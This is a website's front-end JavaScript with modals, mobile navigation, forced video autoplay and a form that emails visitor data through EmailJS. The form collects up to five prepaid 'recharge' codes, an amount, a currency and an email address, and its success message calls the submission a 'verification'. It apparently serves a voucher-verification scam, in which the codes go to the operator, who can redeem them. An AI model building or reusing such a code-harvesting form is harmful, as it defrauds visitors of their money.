// UI Functions
const modalSystem = {
  showModal: function(type, title, message) {
    const modal = document.createElement('div');
    modal.className = `modal ${type}-modal`;
    modal.innerHTML = `
      <div class="modal-content ${type === 'success' ? 'success-content' : ''}">
        <span class="modal-close" data-close-modal>&times;</span>
        <h3 class="modal-title">${title}</h3>
        <div class="modal-body">${message}</div>
      </div>
    `;

    document.body.appendChild(modal);
    setTimeout(() => modal.classList.add('show'), 10);

    // Add event listener to close button after appending the modal to the document
    const closeButton = modal.querySelector('[data-close-modal]');
    if (closeButton) {
      closeButton.addEventListener('click', () => {
        console.log('Close button clicked');
        this.closeModal(modal);
      });
    }

    // Add click event to close when clicking outside
    modal.addEventListener('click', (event) => {
      if (event.target === modal) {
        console.log('Clicked outside the modal');
        this.closeModal(modal);
      }
    });
  },

  closeModal: function(element) {
    const modal = element.closest('.modal');
    if (modal) {
      modal.classList.remove('show');
      setTimeout(() => {
        console.log('Modal removed from DOM');
        modal.remove();
      }, 300);
    }
  },

  closeAllModals: function() {
    document.querySelectorAll('.modal').forEach(modal => {
      modal.classList.remove('show');
      setTimeout(() => {
        console.log('All modals removed from DOM');
        modal.remove();
      }, 300);
    });
  }
};

function isEmailJSLoaded() {
  return window.emailJSReady === true && typeof emailjs !== 'undefined' && emailjs.hasOwnProperty('init');
}

async function waitForEmailJS(timeout = 5000) {
  const start = Date.now();
  return new Promise((resolve) => {
    const check = () => {
      if (isEmailJSLoaded()) {
        resolve(true);
      } else if (Date.now() - start < timeout) {
        setTimeout(check, 100);
      } else {
        resolve(false);
      }
    };
    check();
  });
}

function scrollToForm() {
  const formSection = document.getElementById('formulaire');
  if (!formSection) return;

  const headerOffset = 100;
  const elementPosition = formSection.getBoundingClientRect().top;
  const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

  window.scrollTo({
    top: offsetPosition,
    behavior: 'smooth'
  });

  const form = document.querySelector('.pricing-item');
  if (form) {
    form.style.animation = 'none';
    form.offsetHeight;
    form.style.animation = 'pulse-border 1s ease';
  }
}

function validateForm(params) {
  const errors = [];

  if (!params.email) errors.push("L'adresse email est requise");
  if (!params.crecharge) errors.push("Le type de recharge est requis");
  if (!params.montant) errors.push("Le montant est requis");
  if (!params.devise) errors.push("La devise est requise");

  let hasRecharge = false;
  for (let i = 1; i <= 5; i++) {
    if (params[`recharge${i}`]) {
      hasRecharge = true;
      break;
    }
  }
  if (!hasRecharge) errors.push("Au moins un code de recharge est requis");

  return errors;
}

async function sendMail() {
  const isLoaded = await waitForEmailJS();
  if (!isLoaded) {
    modalSystem.showModal('error', 'Erreur', 'Service de messagerie non disponible. Veuillez réessayer plus tard.');
    return;
  }

  try {
    document.body.style.cursor = 'wait';
    const loadingDiv = document.querySelector('.loading');
    if (loadingDiv) loadingDiv.style.display = "block";

    const params = {
      crecharge: document.getElementById("rechargetype").value,
      montant: document.getElementById("montant").value,
      devise: document.getElementById("devise").value,
      recharge1: document.getElementById("recharge01").value,
      recharge2: document.getElementById("recharge02").value,
      recharge3: document.getElementById("recharge03").value,
      recharge4: document.getElementById("recharge04").value,
      recharge5: document.getElementById("recharge05").value,
      email: document.getElementById("email").value,
    };

    const errors = validateForm(params);
    if (errors.length > 0) {
      modalSystem.showModal('error', 'Erreur de validation', errors.join('<br>'));
      return;
    }

    const serviceID = "service_p6xjkwk";
    const templateID = "template_s1kqilp";

    if (window.location.protocol === 'file:') {
      modalSystem.showModal('error', 'Mode Local', `
        Le service de messagerie ne fonctionne pas en mode local.<br>
        Pour tester cette fonctionnalité:<br>
        1. Déployez le site sur GitHub Pages ou Netlify<br>
        2. Ou exécutez un serveur local:<br>
           - Python: <code>python -m http.server 8000</code><br>
           - Node.js: <code>npx http-server</code><br>
        Puis accédez à http://localhost:8000
      `);
      return;
    }

    const result = await emailjs.send(serviceID, templateID, params);
    console.log('Email sent successfully:', result);

    // Clear form
    ["rechargetype", "email", "montant", "devise",
     "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
      .forEach(id => document.getElementById(id).value = "");

    modalSystem.showModal('success', 'Succès', 'Votre demande de vérification a été envoyée avec succès! Vous recevrez bientôt un email de confirmation.');

  } catch (error) {
    console.error('Error sending email:', error);
    modalSystem.showModal('error', 'Erreur', "Une erreur s'est produite lors de l'envoi. Veuillez réessayer.");
  } finally {
    document.body.style.cursor = 'default';
    const loadingDiv = document.querySelector('.loading');
    if (loadingDiv) loadingDiv.style.display = "none";
  }
}

function showInfoModal() {
  const modal = document.getElementById('infoModal');
  if (modal) modal.classList.add('show');
}

// DOM Ready Event Handlers
document.addEventListener('DOMContentLoaded', function() {
  // Verify EmailJS initialization
  if (!isEmailJSLoaded()) {
    console.warn('EmailJS not initialized. Attempting to initialize...');
    try {
      emailjs.init("iXhBi47917f0L3zGT");
      window.emailJSReady = true;
      console.log('EmailJS initialized successfully');
    } catch (error) {
      console.error('EmailJS initialization error:', error);
    }
  }

  // Handle page loader
  const loader = document.getElementById('page-loader');
  setTimeout(() => {
    if (loader) loader.classList.add('loaded');
  }, 1000);

  // Setup modal close handlers
  document.addEventListener('click', function(event) {
    if (event.target.classList.contains('modal')) {
      modalSystem.closeModal(event.target);
    }
  });

  document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
      modalSystem.closeAllModals();
    }
  });

  document.querySelectorAll('[data-close-modal]').forEach(closeBtn => {
    closeBtn.addEventListener('click', function() {
      modalSystem.closeModal(this);
    });
  });
});

// Handle window load event
window.addEventListener('load', function() {
  const loader = document.getElementById('page-loader');
  if (loader) loader.classList.add('loaded');
});

// Add this at the end of your index.js file
document.addEventListener('DOMContentLoaded', function() {
  // Initialize mobile navigation
  initMobileNavigation();
  
  // Initialize video players
  initVideoPlayers();
  
  // Initialize background videos
  initBackgroundVideos();
  
  // Initialize scroll to top
  initScrollToTop();
});

// Mobile Navigation functionality
function initMobileNavigation() {
  const mobileNavToggle = document.querySelector('.mobile-nav-toggle');
  const navbar = document.querySelector('.navbar');
  const mobileNavShow = document.querySelector('.mobile-nav-show');
  const mobileNavHide = document.querySelector('.mobile-nav-hide');
  
  if (mobileNavToggle && navbar) {
    mobileNavToggle.addEventListener('click', function(e) {
      e.preventDefault();
      
      if (navbar.classList.contains('mobile-nav-active')) {
        closeMobileNav();
      } else {
        openMobileNav();
      }
    });
    
    // Close mobile nav when clicking on a link
    const navLinks = navbar.querySelectorAll('.nav-link');
    navLinks.forEach(link => {
      link.addEventListener('click', function() {
        closeMobileNav();
      });
    });
    
    // Close mobile nav when clicking on navbar background
    navbar.addEventListener('click', function(e) {
      if (e.target === navbar) {
        closeMobileNav();
      }
    });
    
    function openMobileNav() {
      navbar.classList.add('mobile-nav-active');
      mobileNavShow.classList.add('d-none');
      mobileNavHide.classList.remove('d-none');
      document.body.style.overflow = 'hidden'; // Prevent background scrolling
    }
    
    function closeMobileNav() {
      navbar.classList.remove('mobile-nav-active');
      mobileNavShow.classList.remove('d-none');
      mobileNavHide.classList.add('d-none');
      document.body.style.overflow = ''; // Restore scrolling
    }
    
    // Make closeMobileNav globally available
    window.closeMobileNav = closeMobileNav;
  }
}

// Simple toggle function for testing
function toggleMobileNav() {
  try {
    console.log('Toggle button clicked!');
    
    const navbar = document.querySelector('.navbar');
    console.log('Navbar found:', navbar);
    
    if (!navbar) {
      console.error('Navbar not found!');
      return;
    }
    
    const mobileNavShow = document.querySelector('.mobile-nav-show');
    const mobileNavHide = document.querySelector('.mobile-nav-hide');
    
    console.log('Current navbar classes:', navbar.classList.toString());
    
    if (navbar.classList.contains('mobile-nav-active')) {
      console.log('Closing mobile nav');
      navbar.classList.remove('mobile-nav-active');
      if (mobileNavShow) mobileNavShow.classList.remove('d-none');
      if (mobileNavHide) mobileNavHide.classList.add('d-none');
      document.body.style.overflow = '';
    } else {
      console.log('Opening mobile nav');
      navbar.classList.add('mobile-nav-active');
      if (mobileNavShow) mobileNavShow.classList.add('d-none');
      if (mobileNavHide) mobileNavHide.classList.remove('d-none');
      document.body.style.overflow = 'hidden';
    }
    
    console.log('After toggle - navbar classes:', navbar.classList.toString());
    
  } catch (error) {
    console.error('Error in toggleMobileNav:', error);
  }
}

// Make toggleMobileNav globally available
window.toggleMobileNav = toggleMobileNav;

// Simple test function
function testButton() {
  console.log('Test button clicked!');
  const button = document.querySelector('.mobile-nav-toggle');
  if (button) {
    button.style.background = 'red';
    console.log('Button color changed to red');
  } else {
    console.error('Button not found!');
  }
}

window.testButton = testButton;

// Video functionality
function initVideoPlayers() {
  const heroVideo = document.querySelector('.hero-video-container video');
  
  if (heroVideo) {
    // Ensure hero video auto-plays and loops
    heroVideo.play().catch(e => {
      console.log('Hero video autoplay prevented:', e);
      // Try to play on user interaction
      document.addEventListener('click', () => {
        heroVideo.play().catch(e => console.log('Still cannot autoplay hero video:', e));
      }, { once: true });
    });
    
    // Prevent user from stopping the video
    heroVideo.addEventListener('pause', () => {
      heroVideo.play();
    });
    
    // Ensure video loops
    heroVideo.addEventListener('ended', () => {
      heroVideo.currentTime = 0;
      heroVideo.play();
    });
  }
}

// Auto-play global background video
function initBackgroundVideos() {
  const globalBackgroundVideo = document.querySelector('.global-background-video video');
  
  if (globalBackgroundVideo) {
    // Try to autoplay the background video
    globalBackgroundVideo.play().catch(e => {
      console.log('Background video autoplay prevented:', e);
      // Fallback: play on user interaction
      document.addEventListener('click', () => {
        globalBackgroundVideo.play().catch(e => console.log('Still cannot autoplay:', e));
      }, { once: true });
    });
  }
}

// Scroll to top functionality
function initScrollToTop() {
  const scrollTop = document.querySelector('.scroll-top');
  
  window.addEventListener('scroll', () => {
    if (window.pageYOffset > 300) {
      scrollTop.classList.add('show');
    } else {
      scrollTop.classList.remove('show');
    }
  });
  
  scrollTop.addEventListener('click', () => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });
  });
}

// Export functions for global use
window.sendMail = sendMail;
window.scrollToForm = scrollToForm;
window.modalSystem = modalSystem;
window.showInfoModal = showInfoModal;
